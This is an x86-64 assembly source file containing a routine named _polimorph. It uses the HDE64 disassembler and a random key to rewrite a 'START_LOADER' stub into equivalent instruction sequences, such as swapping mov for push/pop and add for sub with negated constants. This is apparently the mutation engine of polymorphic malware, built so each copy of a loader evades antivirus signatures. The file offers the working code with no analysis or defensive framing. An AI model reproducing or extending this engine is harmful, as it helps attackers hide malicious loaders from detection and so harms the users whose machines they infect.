;-----------------------------------------------------------------------------------------------------------------------------------------
;IN: rsi - buf FROM; rdi - buf TO; r8 - bufer for table of command(START_LOADER) len == tab_code_len; rbp - random indentificator;
;OUT: rax - addr of command 'add rsi, rax' in buf TO;//rax - 0(ERROR);  rcx - size of new START_LOADER; r8 - start addr of 'tab_code_len';
;-----------------------------------------------------------------------------------------------------------------------------------------
_polimorph:
     ; mov   rbp,  0x700
     ; mov   rbp,  0x600
     ; mov   rbp,  0x400
     ; mov   rbp,  rsp

      push  rdi
      push  r8
      push  r9
 
      mov   rdx,  rdi
      sub   rsp,  hde64s_size+8
      ;sub   rsp,  8           ;#
      push  rsp
      pop   rdi
      xor   rcx,  rcx
      ;mov   byte[rsp],  -1 
      mov   byte[rsp],  cl

      push  rbp
      pop   rax
      shr   eax,  6
      and   eax,  0x03
      push  rbp
      push  rax

   polim_loop:
      pop   rax
      push  rax
      cmp   al,   byte[rsp+16]
      je    .chang 
   .loo:
      xor   ebp,  ebp
   .loop:
      xor   eax,  eax
      call  pol_loop
      cmp   rax,  -1
      je    .loop_exit
      cmp   eax,  -2
      je   .loop_err
   .loop_nxt:
      cmp   eax,  0xFFFFFFFF
      jne   .loop
      inc   byte[rsp+16]         ;#
      jmp   polim_loop
   .chang:
      pop   rax
      pop   rbp
      push  rcx
      mov   cl,   0x04
      cbw   
      div   cl 
      mov   ch,   ah
      mul   cl
      mov   ah,   ch       ;ah-остаток от деления; al- целая часть умноженная на 4
      add   al,   0x04

      push  rbp
      pop   rcx
      shr   ecx,  8
      xchg  eax,  ecx
      shr   eax,  cl                
      and   al,   0x03
      add   al,   cl 
      pop   rcx
      push  rbp
      push  rax
      jmp   .loop
   .loop_err:
      push  0
      pop   r9
   .loop_exit:
      pop   rax
      pop   rbp
      
      add   rsp,  hde64s_size+8
      mov   rax,  r9
      pop   r9
      pop   r8
      pop   rdi
   ret
;=========================================================================
;========================================================================= 
   pol_loop:
      push  rbp
      push  rax
      push  rcx
      push  rsi
      call  _hde
      pop   rbx
      cmp   al,   0
      je    polim_exit
      mov   al,   byte[rdi+hde64s.opcode]
      and   al,   0xF8                    ;check B8-BF opcode
      cmp   al,   0xB8
      je    mov_imm32_opcode
      mov   al,   byte[rdi+hde64s.opcode]
      and   al,   0x78                    ;check 'push' opcode
      cmp   al,   0x50
      je    push_reg_opcode
      cmp   al,   0x68
      je    push_imm_opcode
      cmp   byte[rdi+hde64s.opcode],   0x89
      je    mov_reg_opcode
      mov   al,   byte[rdi+hde64s.opcode]
      and   al,   0xF8           ;0b11111000
      cmp   al,   0x80
      je    sub_add_cmp_xor_and_or_adc_sbb_opcode
      cmp   al,   0x28
      je    sub_opcode
      cmp   al,   0x00
      je    add_opcode
      cmp   byte[rdi+hde64s.opcode],   0xAD  ;check 'lodsd' opcode
      ;je    lodsd_opcode
      jne   pol_cp_comm
      mov   sil,  0x06
     pol_cp_comm:
      push  rsi
      pop   rcx
      xchg  rbx,  rsi
      xchg  rdi,  rdx
      rep   movsb
      ;xchg  rbx,  rsi
      xchg  rdi,  rdx

      pop   rcx
      add   ecx,  ebx
      mov   byte[r8],   bl
      inc   r8

      cmp   byte[rdi+hde64s.opcode],   0xff     ;opcode of 'jmp reg'
      jne   pol_to_loop1
      ;mov   qword[rsp],  -1
      pop   rax
      pop   rbp
      push  -1
      pop   rax
   ret
   pol_to_loop:
      add   rsi,  rbx         ;addr of next command
   pol_to_loop1:
      pop   rax
      pop   rbp
   ret
;------
   mov_imm32_opcode:
      ;push imm
      ;pop  reg
      mov   dword[rsp+8], -1
      cmp   ebp,  0
      jne   cont1
      ;mov   eax,  -1
      jmp   pol_cp_comm
   cont1:
      mov   ecx,  dword[rbx+1]
      cmp   ecx,  0x7FFFFFFF
      jbe   cont
      jmp   pol_cp_comm 
   cont:
      mov   cl,   byte[rdi+hde64s.opcode]
      and   cl,   0x07
      push  rcx                           ;**
      mov   ch,   byte[rbx-1]
      and   ch,   0x07
      cmp   ch,   cl
      jne   mov_imm32_strt
 
      mov   ax,   word[rbx-3]
      cmp   ax,   0x3148         ;'xor reg, reg'
      je    mov_imm32_ckend
      ;jmp   mov_imm32_strt
   mov_imm32_p0:
      cmp   ax,   0x006A
      jne   mov_imm32_strt
      dec   r8
   mov_imm32_ckend:
      sub   rdx,  3
      dec   r8
      ;sub   rsi,  3
      sub   qword[rsp+8], 3      ;chang 'push rcx' in 'pol_loop'

   mov_imm32_strt:
      pop   rax                  ;**   ;check reg from opcode
      or    al,   0x58           ;'pop reg'
      mov   ecx,  dword[rbx+1]
      cmp   ecx,  0x7F
      jbe   byte_push

      mov   byte[rdx],  0x68
      mov   byte[rdx+5],   al      ;'pop reg'
      mov   dword[rdx+1],  ecx
      add   rdx,  6
      push  5
      pop   rax
      jmp  mov_imm32_exit

   byte_push:
      mov   byte[rdx],  0x6A
      mov   byte[rdx+2],   al      ;'pop reg'
      mov   byte[rdx+1],   cl
      add   rdx,  3
      push  2
      pop   rax
 
   mov_imm32_exit:
      cmp   word[rbx+5],   0x6348   ;'movsxd ...,...'
      jne   m_i_e
      add   rbx,  3
   m_i_e:
      mov   byte[r8],   al
      mov   byte[r8+1], 1
      add   r8,   2
      pop   rcx            ;from 'pol_loop'
      add   rcx,  rax
      inc   ecx
   jmp   pol_to_loop
;-----
   push_reg_opcode:
          ;mov  reg1, reg2
      mov   al,   byte[rbx+1]
      mov   cl,   al
      and   al,   0x58
      cmp   al,   0x58
      jne   pol_cp_comm

      mov   dword[rsp+8], -1
      cmp   ebp,  0
      jne   pro_cont
     ; mov   eax,  -1
      jmp   pol_cp_comm
   pro_cont:
      mov   al,   byte[rdi+hde64s.opcode]
      and   al,   0x07
      mov   word[rdx],  0x8948         ;REX+opcode(0x89)-mov rreg, rreg
      shl   al,   3
      and   cl,   0x07
      or    cl,   al
      or    cl,   0xC0                 ;cl - byte after opcode(0x89). cl(0-2 bits)-to reg, cl(3-5 bits)-from reg, cl(6,7 bits) - 11
      mov   byte[rdx+2],   cl
      add   rdx,  3
      inc   rbx
      pop   rcx                     ;from 'pol_loop'
      add   ecx,  3
      mov   byte[r8],   0x03
      inc   r8
   jmp   pol_to_loop
 
;-----
   push_imm_opcode:
         ;   if bpl == 0                 ; if bpl == 1              ; if bpl == 2
         ;xor  reg, reg                  ;mov ereg, 0x...           ;push 0; pop rreg
         ;mov  reg, 0x0...(imm32)        ;movsxd rreg, ereg         ;mov ereg, 0x...
   p_imm_strt:
      xor   ecx,  ecx
      mov   al,   byte[rdi+hde64s.opcode]
      cmp   al,   0x6A

      jne   im_4bytes
   ;------ if were is 'mov reg, imm32' after 'push 0; pop reg'
      mov   al,   byte[rbx+3]
      mov   ah,   al
      and   al,   0xF8
      cmp   al,   0xB8
      jne   p_imm_cont
      mov   cl,   byte[rbx+2]    ;cmp regs
      and   cl,   0x07
      and   ah,   0x07
      cmp   ah,   cl
      jne   p_imm_cont
      inc   rbx
      pop   rcx            ;from 'pol_loop'
      jmp   pol_to_loop
   ;-------------
   p_imm_cont:
      mov   al,   byte[rbx+2]
      ;mov   cl,   al
      push  rax
      and   al,   0x58
      cmp   al,   0x58
      jne   p_imm_err
      mov   cl,   byte[rbx+1]
      jmp   p_imm_wr

   im_4bytes:
      ;cmp   al,   0x68  
      ;jne   pol_to_loop
      mov   al,   byte[rbx+5]
      push  rax
      and   al,   0x58
      cmp   al,   0x58
      jne   p_imm_err
      mov   ecx,  dword[rbx+1]
   p_imm_wr:
      pop   rax
   ;-----------------------
      mov   dword[rsp+8], -1
      cmp   ebp,  0
      jne   pioi_cont
     ; mov   eax,  -1
      jmp   pol_cp_comm
   pioi_cont: 
      shr   rbp,  8
      and   bpl,  0x07
      bsf   bp,   bp
   ;-----------------------
      and   al,   0x07
      push  rax
      or    al,   0xB8
      cmp   bpl,  0x01        ;0b0010       ;0x02
      je    p_imm_aft

      mov   byte[rdx+3], al
      mov   dword[rdx+4], ecx
      jmp   p_imm_ckck
   p_imm_aft:
      mov   byte[rdx],  al
      mov   dword[rdx+1],  ecx
   p_imm_ckck:
      pop   rcx
      cmp   bpl,  0x02     ;0x04      ;0b0100
      je    p_push
      shl   al,   3
      or    al,   cl
 
      cmp   bpl,  0x01     ;0x02
      je    p_movsxd
   p_xor_wr:
      mov   byte[rdx+2],   al
      mov   word[rdx],  0x3148      ;xor reg, reg(3bytes) == 0x48, 0x31, 0xregreg
      mov   word[r8],   0x0503
      ;add   r8,   2
   p_imm_ok:
      add   rdx,  8
      inc   rbx
      pop   rcx                  ;from 'pol_loop'
      add   ecx,  8
      add   r8,   2
      jmp   pol_to_loop
   p_imm_err:
      pop   rax
      pop   rcx                  ;from 'pol_loop'
      jmp   pol_to_loop
   p_movsxd:
      mov   word[rdx+5],   0x6348      ;movsxd rreg, ereg == 0x48, 63, 0xregreg
      mov   byte[rdx+7],   al
      mov   word[r8],   0x0305
      ;add   r8,   2
      jmp   p_imm_ok
   p_push:
      mov   word[rdx],   0x006A      ;push 0
      or    cl,   0x58
      mov   byte[rdx+2],   cl          ;pop reg
      mov   dword[r8],  0x00050102
      inc   r8
      jmp   p_imm_ok
;-----
   mov_reg_opcode:
      ;push reg1
      ;pop  reg2
      mov   dword[rsp+8], -1
      cmp   ebp,  0
      jne   mro_cont
     ; mov   eax,  -1
      jmp   pol_cp_comm
   mro_cont: 
      mov   al,   byte[rbx+2]
      mov   ah,   al
      and   ah,   0x07        ;TO reg
      or    ah,   0x58        ;pop reg

      shr   al,   3           ;FROM reg
      and   al,   0x07
      or    al,   0x50        ;push reg

      mov   word[rdx],  ax
      add   rdx,  2
      pop   rcx
      add   ecx,  2
      mov   word[r8],   0x0101
      add   r8,   2
      jmp   pol_to_loop
;-----      
   ;lodsd_opcode:
   ;   mov   sil,  0x06
   ;   jmp   pol_cp_comm
;-----
   sub_add_cmp_xor_and_or_adc_sbb_opcode:
      mov   dword[rsp+8], -1
      cmp   ebp,  0
      jne   sacx_cont
     ; mov   eax,  -1
      jmp   pol_cp_comm
   sacx_cont:
      cmp   byte[rdi+hde64s.opcode],   0x81
      je    .sub_add_imm32 
      cmp   byte[rdi+hde64s.opcode],   0x83
      je    .opcode83
      jmp   .exit
   .sub_add_imm32:
      mov   al,   byte[rdi+hde64s.modrm_ro]
      cmp   al,   0x05        ;sub
      jne   .add_81
      mov   cl,   0x00      
      jmp   .wr_81
   .add_81:
      cmp   al,   0x00        ;add
      jne   .exit
      mov   cl,   0x05
   .wr_81:
      mov   al,   byte[rbx+2]
      and   al,   0b11000111
      shl   cl,   3
      or    al,   cl
      mov   byte[rbx+2],   al
      mov   eax,  dword[rbx+3]
      neg   eax
      mov   dword[rbx+3],  eax
      jmp   .exit 
   .opcode83:
   .exit:
      jmp   pol_cp_comm
;-----
   sub_opcode:
      mov   dword[rsp+8], -1
   sub_cont: 
      mov   ch,   byte[rdi+hde64s.opcode]
      and   ch,   0x07
      xor   cl,   cl
      jmp   arif
;-----
   add_opcode:
      mov   dword[rsp+8], -1
      mov   ch,   byte[rdi+hde64s.opcode]
      mov   cl,   0x28
   arif:
      cmp   ch,   0x01
      je    .rm32_32
      cmp   ebp,  0
      je    pol_cp_comm
      cmp   ch,   0x05
      je    .rax_imm32
      jmp   pol_cp_comm
   .rm32_32:
      mov   r9,   rdx
      ;or    cl,   0x01
      ;mov   byte[rbx+1],   cl
      ;mov   al,   byte[rbx+2]
      ;shr   al,   3
      ;and   al,   7
      ;mov  3bytes[rdx],   neg_reg(reg in al)
      ;mov  byte[r8],   3
      ;inc  r8
      ;add  rdx,  3
      jmp   pol_cp_comm
   .rax_imm32:
      mov   eax,  dword[rbx+2]
      neg   eax
      mov   dword[rbx+2],  eax 
      or    cl,   ch
      mov   byte[rbx+1],   cl 
      jmp   pol_cp_comm
;-----
   polim_exit:
      pop   rcx
   polim_error:
      pop   rax
      pop   rbp
      mov   eax,  -2
   ret
   
;---------------------------------------------------------------------------------------------------------------------------
